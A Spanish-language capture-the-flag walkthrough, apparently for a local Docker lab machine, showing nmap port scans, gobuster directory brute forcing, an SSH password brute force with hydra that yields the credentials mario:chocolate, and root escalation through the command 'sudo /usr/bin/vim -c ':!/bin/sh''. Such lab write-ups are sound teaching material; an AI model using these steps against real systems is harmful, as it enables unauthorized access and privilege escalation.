![1](Images/1.png)

Comenzamos enumerando los puertos abiertos de la máquina objetivo

``sudo nmap 172.17.0.2 -sS -p- --open --min-rate 5000 -n -Pn``

![2](Images/2.png)

Vemos p22 y 80, que muy probablemente sean SSH y HTTP, pero vamos a ver con el siguiente escaneo con más profundidad qué versiones y servicios están corriendo.

``nmap 172.17.0.2 -scV -p22,80``

![3](Images/3.png)

Como bien nos indica el output de nmap, si entramos a nivel de navegador, nos encontramos un apache default. No tiene nada interesante a nivel de código fuente y no existe un robots.txt.

Toca hacer fuerza bruta de directorios a ver si encontramos algo.

``gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt``

![4](Images/4.png)

Recurso que llama la atención: ``http://172.17.0.2/secret.php``

![5](Images/5.png)


Ojo. Tenemos un posible usuario: ``mario``.

No parece que encontremos nada más de utilidad, por lo que se decide lanzar fuerza bruta con ``hydra`` contra el servicio ``SSH``.

![6](Images/6.png)

Estupendo, tenemos credenciales válidas: ``mario``:``chocolate``. Podemos conectarnos por ``ssh`` a la máquina víctima.

``ssh mario@172.17.0.2``

![7](Images/7.png)

Estamos dentro de la máquina víctima.

# Privesc

``sudo -l``

![8](Images/8.png)

Ojo, tenemos el binario ``/usr/bin/vim`` con permisos de sudo.

Vamos a echarle un ojo en gtfobins.

https://gtfobins.github.io/gtfobins/vim/#sudo

![9](Images/9.png)

``sudo /usr/bin/vim -c ':!/bin/sh'``

![10](Images/10.png)

Hemos escalado a root desde el usuario mario exitosamente.
